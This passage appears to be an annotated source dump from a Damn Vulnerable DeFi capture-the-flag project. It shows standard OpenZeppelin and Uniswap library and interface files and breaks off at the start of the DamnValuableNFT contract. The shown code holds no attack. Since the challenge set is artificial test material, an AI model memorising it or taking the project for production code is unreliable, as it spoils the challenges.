    |      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function safeTransferFrom(
    |         address from,
    |         address to,
    |         uint256 tokenId,
    |         bytes calldata data
    |     ) external;
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @title ERC721 token receiver interface
    |  * @dev Interface for any contract that wants to support safeTransfers
    |  * from ERC721 asset contracts.
    |  */
    | interface IERC721Receiver {
    |     /**
    |      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
    |      * by `operator` from `from`, this function is called.
    |      *
    |      * It must return its Solidity selector to confirm the token transfer.
    |      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
    |      *
    |      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
    |      */
    |     function onERC721Received(
    |         address operator,
    |         address from,
    |         uint256 tokenId,
    |         bytes calldata data
    |     ) external returns (bytes4);
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../ERC721.sol";
    | import "../../../utils/Context.sol";
    | 
    | /**
    |  * @title ERC721 Burnable Token
    |  * @dev ERC721 Token that can be irreversibly burned (destroyed).
    |  */
    | abstract contract ERC721Burnable is Context, ERC721 {
    |     /**
    |      * @dev Burns `tokenId`. See {ERC721-_burn}.
    |      *
    |      * Requirements:
    |      *
    |      * - The caller must own `tokenId` or be an approved operator.
    |      */
    |     function burn(uint256 tokenId) public virtual {
    |         //solhint-disable-next-line max-line-length
    |         require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721Burnable: caller is not owner nor approved");
    |         _burn(tokenId);
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../IERC721.sol";
    | 
    | /**
    |  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
    |  * @dev See https://eips.ethereum.org/EIPS/eip-721
    |  */
    | interface IERC721Metadata is IERC721 {
    |     /**
    |      * @dev Returns the token collection name.
    |      */
    |     function name() external view returns (string memory);
    | 
    |     /**
    |      * @dev Returns the token collection symbol.
    |      */
    |     function symbol() external view returns (string memory);
    | 
    |     /**
    |      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
    |      */
    |     function tokenURI(uint256 tokenId) external view returns (string memory);
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/Address.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Collection of functions related to the address type
    |  */
    | library Address {
    |     /**
    |      * @dev Returns true if `account` is a contract.
    |      *
    |      * [IMPORTANT]
    |      * ====
    |      * It is unsafe to assume that an address for which this function returns
    |      * false is an externally-owned account (EOA) and not a contract.
    |      *
    |      * Among others, `isContract` will return false for the following
    |      * types of addresses:
    |      *
    |      *  - an externally-owned account
    |      *  - a contract in construction
    |      *  - an address where a contract will be created
    |      *  - an address where a contract lived, but was destroyed
    |      * ====
    |      */
r   |     function isContract(address account) internal view returns (bool) {
    |         // This method relies on extcodesize, which returns 0 for contracts in
    |         // construction, since the code is only stored at the end of the
    |         // constructor execution.
    | 
r   |         uint256 size;
    |         assembly {
r   |             size := extcodesize(account)
    |         }
r   |         return size > 0;
    |     }
    | 
    |     /**
    |      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
    |      * `recipient`, forwarding all available gas and reverting on errors.
    |      *
    |      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
    |      * of certain opcodes, possibly making contracts go over the 2300 gas limit
    |      * imposed by `transfer`, making them unable to receive funds via
    |      * `transfer`. {sendValue} removes this limitation.
    |      *
    |      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
    |      *
    |      * IMPORTANT: because control is transferred to `recipient`, care must be
    |      * taken to not create reentrancy vulnerabilities. Consider using
    |      * {ReentrancyGuard} or the
    |      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
    |      */
    |     function sendValue(address payable recipient, uint256 amount) internal {
    |         require(address(this).balance >= amount, "Address: insufficient balance");
    | 
    |         (bool success, ) = recipient.call{value: amount}("");
    |         require(success, "Address: unable to send value, recipient may have reverted");
    |     }
    | 
    |     /**
    |      * @dev Performs a Solidity function call using a low level `call`. A
    |      * plain `call` is an unsafe replacement for a function call: use this
    |      * function instead.
    |      *
    |      * If `target` reverts with a revert reason, it is bubbled up by this
    |      * function (like regular Solidity function calls).
    |      *
    |      * Returns the raw returned data. To convert to the expected return value,
    |      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
    |      *
    |      * Requirements:
    |      *
    |      * - `target` must be a contract.
    |      * - calling `target` with `data` must not revert.
    |      *
    |      * _Available since v3.1._
    |      */
r   |     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
r   |         return functionCall(target, data, "Address: low-level call failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
    |      * `errorMessage` as a fallback revert reason when `target` reverts.
    |      *
    |      * _Available since v3.1._
    |      */
r   |     function functionCall(
    |         address target,
    |         bytes memory data,
    |         string memory errorMessage
r   |     ) internal returns (bytes memory) {
r   |         return functionCallWithValue(target, data, 0, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
    |      * but also transferring `value` wei to `target`.
    |      *
    |      * Requirements:
    |      *
    |      * - the calling contract must have an ETH balance of at least `value`.
    |      * - the called Solidity function must be `payable`.
    |      *
    |      * _Available since v3.1._
    |      */
    |     function functionCallWithValue(
    |         address target,
    |         bytes memory data,
    |         uint256 value
    |     ) internal returns (bytes memory) {
    |         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
    |      * with `errorMessage` as a fallback revert reason when `target` reverts.
    |      *
    |      * _Available since v3.1._
    |      */
r   |     function functionCallWithValue(
    |         address target,
    |         bytes memory data,
    |         uint256 value,
    |         string memory errorMessage
r   |     ) internal returns (bytes memory) {
r   |         require(address(this).balance >= value, "Address: insufficient balance for call");
r   |         require(isContract(target), "Address: call to non-contract");
    | 
r   |         (bool success, bytes memory returndata) = target.call{value: value}(data);
r   |         return verifyCallResult(success, returndata, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
    |      * but performing a static call.
    |      *
    |      * _Available since v3.3._
    |      */
    |     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
    |         return functionStaticCall(target, data, "Address: low-level static call failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
    |      * but performing a static call.
    |      *
    |      * _Available since v3.3._
    |      */
    |     function functionStaticCall(
    |         address target,
    |         bytes memory data,
    |         string memory errorMessage
    |     ) internal view returns (bytes memory) {
    |         require(isContract(target), "Address: static call to non-contract");
    | 
    |         (bool success, bytes memory returndata) = target.staticcall(data);
    |         return verifyCallResult(success, returndata, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
    |      * but performing a delegate call.
    |      *
    |      * _Available since v3.4._
    |      */
    |     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
    |         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
    |      * but performing a delegate call.
    |      *
    |      * _Available since v3.4._
    |      */
    |     function functionDelegateCall(
    |         address target,
    |         bytes memory data,
    |         string memory errorMessage
    |     ) internal returns (bytes memory) {
    |         require(isContract(target), "Address: delegate call to non-contract");
    | 
    |         (bool success, bytes memory returndata) = target.delegatecall(data);
    |         return verifyCallResult(success, returndata, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
    |      * revert reason using the provided one.
    |      *
    |      * _Available since v4.3._
    |      */
r   |     function verifyCallResult(
    |         bool success,
    |         bytes memory returndata,
    |         string memory errorMessage
r   |     ) internal pure returns (bytes memory) {
r   |         if (success) {
r   |             return returndata;
    |         } else {
    |             // Look for revert reason and bubble it up if present
r   |             if (returndata.length > 0) {
    |                 // The easiest way to bubble the revert reason is using memory via assembly
    | 
    |                 assembly {
    |                     let returndata_size := mload(returndata)
    |                     revert(add(32, returndata), returndata_size)
    |                 }
    |             } else {
r   |                 revert(errorMessage);
    |             }
    |         }
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/Arrays.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./math/Math.sol";
    | 
    | /**
    |  * @dev Collection of functions related to array types.
    |  */
    | library Arrays {
    |     /**
    |      * @dev Searches a sorted `array` and returns the first index that contains
    |      * a value greater or equal to `element`. If no such index exists (i.e. all
    |      * values in the array are strictly less than `element`), the array length is
    |      * returned. Time complexity O(log n).
    |      *
    |      * `array` is expected to be sorted in ascending order, and to contain no
    |      * repeated elements.
    |      */
    |     function findUpperBound(uint256[] storage array, uint256 element) internal view returns (uint256) {
    |         if (array.length == 0) {
    |             return 0;
    |         }
    | 
    |         uint256 low = 0;
    |         uint256 high = array.length;
    | 
    |         while (low < high) {
    |             uint256 mid = Math.average(low, high);
    | 
    |             // Note that mid will always be strictly less than high (i.e. it will be a valid array index)
    |             // because Math.average rounds down (it does integer division with truncation).
    |             if (array[mid] > element) {
    |                 high = mid;
    |             } else {
    |                 low = mid + 1;
    |             }
    |         }
    | 
    |         // At this point `low` is the exclusive upper bound. We will return the inclusive upper bound.
    |         if (low > 0 && array[low - 1] == element) {
    |             return low - 1;
    |         } else {
    |             return low;
    |         }
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/Context.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Provides information about the current execution context, including the
    |  * sender of the transaction and its data. While these are generally available
    |  * via msg.sender and msg.data, they should not be accessed in such a direct
    |  * manner, since when dealing with meta-transactions the account sending and
    |  * paying for execution may not be the actual sender (as far as an application
    |  * is concerned).
    |  *
    |  * This contract is only required for intermediate, library-like contracts.
    |  */
    | abstract contract Context {
*r  |     function _msgSender() internal view virtual returns (address) {
*r  |         return msg.sender;
    |     }
    | 
    |     function _msgData() internal view virtual returns (bytes calldata) {
    |         return msg.data;
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/Counters.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @title Counters
    |  * @author Matt Condon (@shrugs)
    |  * @dev Provides counters that can only be incremented, decremented or reset. This can be used e.g. to track the number
    |  * of elements in a mapping, issuing ERC721 ids, or counting request ids.
    |  *
    |  * Include with `using Counters for Counters.Counter;`
    |  */
    | library Counters {
    |     struct Counter {
    |         // This variable should never be directly accessed by users of the library: interactions must be restricted to
    |         // the library's function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add
    |         // this feature: see https://github.com/ethereum/solidity/issues/4637
    |         uint256 _value; // default: 0
    |     }
    | 
    |     function current(Counter storage counter) internal view returns (uint256) {
    |         return counter._value;
    |     }
    | 
    |     function increment(Counter storage counter) internal {
    |         unchecked {
    |             counter._value += 1;
    |         }
    |     }
    | 
    |     function decrement(Counter storage counter) internal {
    |         uint256 value = counter._value;
    |         require(value > 0, "Counter: decrement overflow");
    |         unchecked {
    |             counter._value = value - 1;
    |         }
    |     }
    | 
    |     function reset(Counter storage counter) internal {
    |         counter._value = 0;
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/Strings.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev String operations.
    |  */
    | library Strings {
    |     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
    | 
    |     /**
    |      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
    |      */
    |     function toString(uint256 value) internal pure returns (string memory) {
    |         // Inspired by OraclizeAPI's implementation - MIT licence
    |         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
    | 
    |         if (value == 0) {
    |             return "0";
    |         }
    |         uint256 temp = value;
    |         uint256 digits;
    |         while (temp != 0) {
    |             digits++;
    |             temp /= 10;
    |         }
    |         bytes memory buffer = new bytes(digits);
    |         while (value != 0) {
    |             digits -= 1;
    |             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
    |             value /= 10;
    |         }
    |         return string(buffer);
    |     }
    | 
    |     /**
    |      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
    |      */
    |     function toHexString(uint256 value) internal pure returns (string memory) {
    |         if (value == 0) {
    |             return "0x00";
    |         }
    |         uint256 temp = value;
    |         uint256 length = 0;
    |         while (temp != 0) {
    |             length++;
    |             temp >>= 8;
    |         }
    |         return toHexString(value, length);
    |     }
    | 
    |     /**
    |      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
    |      */
    |     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
    |         bytes memory buffer = new bytes(2 * length + 2);
    |         buffer[0] = "0";
    |         buffer[1] = "x";
    |         for (uint256 i = 2 * length + 1; i > 1; --i) {
    |             buffer[i] = _HEX_SYMBOLS[value & 0xf];
    |             value >>= 4;
    |         }
    |         require(value == 0, "Strings: hex length insufficient");
    |         return string(buffer);
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/introspection/ERC165.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./IERC165.sol";
    | 
    | /**
    |  * @dev Implementation of the {IERC165} interface.
    |  *
    |  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
    |  * for the additional interface id that will be supported. For example:
    |  *
    |  * ```solidity
    |  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
    |  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
    |  * }
    |  * ```
    |  *
    |  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
    |  */
    | abstract contract ERC165 is IERC165 {
    |     /**
    |      * @dev See {IERC165-supportsInterface}.
    |      */
    |     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
    |         return interfaceId == type(IERC165).interfaceId;
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/introspection/IERC165.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Interface of the ERC165 standard, as defined in the
    |  * https://eips.ethereum.org/EIPS/eip-165[EIP].
    |  *
    |  * Implementers can declare support of contract interfaces, which can then be
    |  * queried by others ({ERC165Checker}).
    |  *
    |  * For an implementation, see {ERC165}.
    |  */
    | interface IERC165 {
    |     /**
    |      * @dev Returns true if this contract implements the interface defined by
    |      * `interfaceId`. See the corresponding
    |      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
    |      * to learn more about how these ids are created.
    |      *
    |      * This function call must use less than 30 000 gas.
    |      */
    |     function supportsInterface(bytes4 interfaceId) external view returns (bool);
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/math/Math.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Standard math utilities missing in the Solidity language.
    |  */
    | library Math {
    |     /**
    |      * @dev Returns the largest of two numbers.
    |      */
    |     function max(uint256 a, uint256 b) internal pure returns (uint256) {
    |         return a >= b ? a : b;
    |     }
    | 
    |     /**
    |      * @dev Returns the smallest of two numbers.
    |      */
    |     function min(uint256 a, uint256 b) internal pure returns (uint256) {
    |         return a < b ? a : b;
    |     }
    | 
    |     /**
    |      * @dev Returns the average of two numbers. The result is rounded towards
    |      * zero.
    |      */
    |     function average(uint256 a, uint256 b) internal pure returns (uint256) {
    |         // (a + b) / 2 can overflow.
    |         return (a & b) + (a ^ b) / 2;
    |     }
    | 
    |     /**
    |      * @dev Returns the ceiling of the division of two numbers.
    |      *
    |      * This differs from standard division with `/` in that it rounds up instead
    |      * of rounding down.
    |      */
    |     function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    |         // (a + b - 1) / b can overflow on addition, so we distribute.
    |         return a / b + (a % b == 0 ? 0 : 1);
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/utils/structs/EnumerableSet.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Library for managing
    |  * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
    |  * types.
    |  *
    |  * Sets have the following properties:
    |  *
    |  * - Elements are added, removed, and checked for existence in constant time
    |  * (O(1)).
    |  * - Elements are enumerated in O(n). No guarantees are made on the ordering.
    |  *
    |  * ```
    |  * contract Example {
    |  *     // Add the library methods
    |  *     using EnumerableSet for EnumerableSet.AddressSet;
    |  *
    |  *     // Declare a set state variable
    |  *     EnumerableSet.AddressSet private mySet;
    |  * }
    |  * ```
    |  *
    |  * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)
    |  * and `uint256` (`UintSet`) are supported.
    |  */
    | library EnumerableSet {
    |     // To implement this library for multiple types with as little code
    |     // repetition as possible, we write it in terms of a generic Set type with
    |     // bytes32 values.
    |     // The Set implementation uses private functions, and user-facing
    |     // implementations (such as AddressSet) are just wrappers around the
    |     // underlying Set.
    |     // This means that we can only create new EnumerableSets for types that fit
    |     // in bytes32.
    | 
    |     struct Set {
    |         // Storage of set values
    |         bytes32[] _values;
    |         // Position of the value in the `values` array, plus 1 because index 0
    |         // means a value is not in the set.
    |         mapping(bytes32 => uint256) _indexes;
    |     }
    | 
    |     /**
    |      * @dev Add a value to a set. O(1).
    |      *
    |      * Returns true if the value was added to the set, that is if it was not
    |      * already present.
    |      */
    |     function _add(Set storage set, bytes32 value) private returns (bool) {
    |         if (!_contains(set, value)) {
    |             set._values.push(value);
    |             // The value is stored at length-1, but we add 1 to all indexes
    |             // and use 0 as a sentinel value
    |             set._indexes[value] = set._values.length;
    |             return true;
    |         } else {
    |             return false;
    |         }
    |     }
    | 
    |     /**
    |      * @dev Removes a value from a set. O(1).
    |      *
    |      * Returns true if the value was removed from the set, that is if it was
    |      * present.
    |      */
    |     function _remove(Set storage set, bytes32 value) private returns (bool) {
    |         // We read and store the value's index to prevent multiple reads from the same storage slot
    |         uint256 valueIndex = set._indexes[value];
    | 
    |         if (valueIndex != 0) {
    |             // Equivalent to contains(set, value)
    |             // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
    |             // the array, and then remove the last element (sometimes called as 'swap and pop').
    |             // This modifies the order of the array, as noted in {at}.
    | 
    |             uint256 toDeleteIndex = valueIndex - 1;
    |             uint256 lastIndex = set._values.length - 1;
    | 
    |             if (lastIndex != toDeleteIndex) {
    |                 bytes32 lastvalue = set._values[lastIndex];
    | 
    |                 // Move the last value to the index where the value to delete is
    |                 set._values[toDeleteIndex] = lastvalue;
    |                 // Update the index for the moved value
    |                 set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex
    |             }
    | 
    |             // Delete the slot where the moved value was stored
    |             set._values.pop();
    | 
    |             // Delete the index for the deleted slot
    |             delete set._indexes[value];
    | 
    |             return true;
    |         } else {
    |             return false;
    |         }
    |     }
    | 
    |     /**
    |      * @dev Returns true if the value is in the set. O(1).
    |      */
    |     function _contains(Set storage set, bytes32 value) private view returns (bool) {
    |         return set._indexes[value] != 0;
    |     }
    | 
    |     /**
    |      * @dev Returns the number of values on the set. O(1).
    |      */
    |     function _length(Set storage set) private view returns (uint256) {
    |         return set._values.length;
    |     }
    | 
    |     /**
    |      * @dev Returns the value stored at position `index` in the set. O(1).
    |      *
    |      * Note that there are no guarantees on the ordering of values inside the
    |      * array, and it may change when more values are added or removed.
    |      *
    |      * Requirements:
    |      *
    |      * - `index` must be strictly less than {length}.
    |      */
    |     function _at(Set storage set, uint256 index) private view returns (bytes32) {
    |         return set._values[index];
    |     }
    | 
    |     /**
    |      * @dev Return the entire set in an array
    |      *
    |      * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
    |      * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
    |      * this function has an unbounded cost, and using it as part of a state-changing function may render the function
    |      * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
    |      */
    |     function _values(Set storage set) private view returns (bytes32[] memory) {
    |         return set._values;
    |     }
    | 
    |     // Bytes32Set
    | 
    |     struct Bytes32Set {
    |         Set _inner;
    |     }
    | 
    |     /**
    |      * @dev Add a value to a set. O(1).
    |      *
    |      * Returns true if the value was added to the set, that is if it was not
    |      * already present.
    |      */
    |     function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
    |         return _add(set._inner, value);
    |     }
    | 
    |     /**
    |      * @dev Removes a value from a set. O(1).
    |      *
    |      * Returns true if the value was removed from the set, that is if it was
    |      * present.
    |      */
    |     function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
    |         return _remove(set._inner, value);
    |     }
    | 
    |     /**
    |      * @dev Returns true if the value is in the set. O(1).
    |      */
    |     function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
    |         return _contains(set._inner, value);
    |     }
    | 
    |     /**
    |      * @dev Returns the number of values in the set. O(1).
    |      */
    |     function length(Bytes32Set storage set) internal view returns (uint256) {
    |         return _length(set._inner);
    |     }
    | 
    |     /**
    |      * @dev Returns the value stored at position `index` in the set. O(1).
    |      *
    |      * Note that there are no guarantees on the ordering of values inside the
    |      * array, and it may change when more values are added or removed.
    |      *
    |      * Requirements:
    |      *
    |      * - `index` must be strictly less than {length}.
    |      */
    |     function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
    |         return _at(set._inner, index);
    |     }
    | 
    |     /**
    |      * @dev Return the entire set in an array
    |      *
    |      * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
    |      * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
    |      * this function has an unbounded cost, and using it as part of a state-changing function may render the function
    |      * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
    |      */
    |     function values(Bytes32Set storage set) internal view returns (bytes32[] memory) {
    |         return _values(set._inner);
    |     }
    | 
    |     // AddressSet
    | 
    |     struct AddressSet {
    |         Set _inner;
    |     }
    | 
    |     /**
    |      * @dev Add a value to a set. O(1).
    |      *
    |      * Returns true if the value was added to the set, that is if it was not
    |      * already present.
    |      */
    |     function add(AddressSet storage set, address value) internal returns (bool) {
    |         return _add(set._inner, bytes32(uint256(uint160(value))));
    |     }
    | 
    |     /**
    |      * @dev Removes a value from a set. O(1).
    |      *
    |      * Returns true if the value was removed from the set, that is if it was
    |      * present.
    |      */
    |     function remove(AddressSet storage set, address value) internal returns (bool) {
    |         return _remove(set._inner, bytes32(uint256(uint160(value))));
    |     }
    | 
    |     /**
    |      * @dev Returns true if the value is in the set. O(1).
    |      */
    |     function contains(AddressSet storage set, address value) internal view returns (bool) {
    |         return _contains(set._inner, bytes32(uint256(uint160(value))));
    |     }
    | 
    |     /**
    |      * @dev Returns the number of values in the set. O(1).
    |      */
    |     function length(AddressSet storage set) internal view returns (uint256) {
    |         return _length(set._inner);
    |     }
    | 
    |     /**
    |      * @dev Returns the value stored at position `index` in the set. O(1).
    |      *
    |      * Note that there are no guarantees on the ordering of values inside the
    |      * array, and it may change when more values are added or removed.
    |      *
    |      * Requirements:
    |      *
    |      * - `index` must be strictly less than {length}.
    |      */
    |     function at(AddressSet storage set, uint256 index) internal view returns (address) {
    |         return address(uint160(uint256(_at(set._inner, index))));
    |     }
    | 
    |     /**
    |      * @dev Return the entire set in an array
    |      *
    |      * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
    |      * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
    |      * this function has an unbounded cost, and using it as part of a state-changing function may render the function
    |      * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
    |      */
    |     function values(AddressSet storage set) internal view returns (address[] memory) {
    |         bytes32[] memory store = _values(set._inner);
    |         address[] memory result;
    | 
    |         assembly {
    |             result := store
    |         }
    | 
    |         return result;
    |     }
    | 
    |     // UintSet
    | 
    |     struct UintSet {
    |         Set _inner;
    |     }
    | 
    |     /**
    |      * @dev Add a value to a set. O(1).
    |      *
    |      * Returns true if the value was added to the set, that is if it was not
    |      * already present.
    |      */
    |     function add(UintSet storage set, uint256 value) internal returns (bool) {
    |         return _add(set._inner, bytes32(value));
    |     }
    | 
    |     /**
    |      * @dev Removes a value from a set. O(1).
    |      *
    |      * Returns true if the value was removed from the set, that is if it was
    |      * present.
    |      */
    |     function remove(UintSet storage set, uint256 value) internal returns (bool) {
    |         return _remove(set._inner, bytes32(value));
    |     }
    | 
    |     /**
    |      * @dev Returns true if the value is in the set. O(1).
    |      */
    |     function contains(UintSet storage set, uint256 value) internal view returns (bool) {
    |         return _contains(set._inner, bytes32(value));
    |     }
    | 
    |     /**
    |      * @dev Returns the number of values on the set. O(1).
    |      */
    |     function length(UintSet storage set) internal view returns (uint256) {
    |         return _length(set._inner);
    |     }
    | 
    |     /**
    |      * @dev Returns the value stored at position `index` in the set. O(1).
    |      *
    |      * Note that there are no guarantees on the ordering of values inside the
    |      * array, and it may change when more values are added or removed.
    |      *
    |      * Requirements:
    |      *
    |      * - `index` must be strictly less than {length}.
    |      */
    |     function at(UintSet storage set, uint256 index) internal view returns (uint256) {
    |         return uint256(_at(set._inner, index));
    |     }
    | 
    |     /**
    |      * @dev Return the entire set in an array
    |      *
    |      * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
    |      * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
    |      * this function has an unbounded cost, and using it as part of a state-changing function may render the function
    |      * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
    |      */
    |     function values(UintSet storage set) internal view returns (uint256[] memory) {
    |         bytes32[] memory store = _values(set._inner);
    |         uint256[] memory result;
    | 
    |         assembly {
    |             result := store
    |         }
    | 
    |         return result;
    |     }
    | }
    | 

/src/node_modules/@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol
    | pragma solidity >=0.5.0;
    | 
    | interface IUniswapV2Pair {
    |     event Approval(address indexed owner, address indexed spender, uint value);
    |     event Transfer(address indexed from, address indexed to, uint value);
    | 
    |     function name() external pure returns (string memory);
    |     function symbol() external pure returns (string memory);
    |     function decimals() external pure returns (uint8);
    |     function totalSupply() external view returns (uint);
    |     function balanceOf(address owner) external view returns (uint);
    |     function allowance(address owner, address spender) external view returns (uint);
    | 
    |     function approve(address spender, uint value) external returns (bool);
    |     function transfer(address to, uint value) external returns (bool);
    |     function transferFrom(address from, address to, uint value) external returns (bool);
    | 
    |     function DOMAIN_SEPARATOR() external view returns (bytes32);
    |     function PERMIT_TYPEHASH() external pure returns (bytes32);
    |     function nonces(address owner) external view returns (uint);
    | 
    |     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    | 
    |     event Mint(address indexed sender, uint amount0, uint amount1);
    |     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    |     event Swap(
    |         address indexed sender,
    |         uint amount0In,
    |         uint amount1In,
    |         uint amount0Out,
    |         uint amount1Out,
    |         address indexed to
    |     );
    |     event Sync(uint112 reserve0, uint112 reserve1);
    | 
    |     function MINIMUM_LIQUIDITY() external pure returns (uint);
    |     function factory() external view returns (address);
    |     function token0() external view returns (address);
    |     function token1() external view returns (address);
    |     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    |     function price0CumulativeLast() external view returns (uint);
    |     function price1CumulativeLast() external view returns (uint);
    |     function kLast() external view returns (uint);
    | 
    |     function mint(address to) external returns (uint liquidity);
    |     function burn(address to) external returns (uint amount0, uint amount1);
    |     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    |     function skim(address to) external;
    |     function sync() external;
    | 
    |     function initialize(address, address) external;
    | }
    | 

/src/contracts/DamnValuableNFT.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
    | import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol";
    | import "@openzeppelin/contracts/access/AccessControl.sol";
    | import "@openzeppelin/contracts/utils/Counters.sol";
    | 
    | /**
    |   * @title DamnValuableNFT
    |   * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |   * @notice Implementation of a mintable and burnable NFT with role-based access controls
    |  */
    | contract DamnValuableNFT is ERC721, ERC721Burnable, AccessControl {
    |     using Counters for Counters.Counter;
    | 
    |     bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    |     Counters.Counter private _tokenIdCounter;
    | 
